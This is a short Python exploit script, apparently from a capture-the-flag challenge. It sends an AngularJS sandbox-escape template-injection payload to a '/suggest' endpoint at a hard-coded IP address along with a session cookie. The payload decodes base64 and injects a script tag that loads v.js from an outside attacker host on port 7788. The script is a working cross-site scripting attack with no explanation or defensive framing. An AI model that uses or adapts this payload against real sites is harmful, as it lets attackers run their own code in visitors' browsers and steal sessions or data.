import requests as req
import base64

HEADERS = {
    "Cookie": "ssssssionid=s%3AP6OdmgTF0paCJ0_vZmay7U0ypPbASNLV.MU3bCFeRFM4cM%2BjnbpRVlrNsZY5gy5B%2BSlgJntHtzJI"
}


def post_suggest(pl):
    pl = base64.b64encode(pl)
    # print(pl)
    data = {
        "suggest": "{" + "{" + "''.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(atob(\"%s\")) //');" % pl + "}" + "}"
    }
    print(data['suggest'])
    res = req.post(url="http://116.62.137.114:4879/suggest",
                   data=data, headers=HEADERS, allow_redirects=False)
    if res.status_code == 302:
        print(res.content)
        # print("success")
    else:
        print("error")


if __name__ == '__main__':
    # pl = "document.write('<script src=\"http://x.x.x.x:7788/v.js\" />');"
    pl = 'var s=document.createElement("script");s.src="http://x.x.x.x:7788/v.js";document.body.appendChild(s);'
    post_suggest(pl)
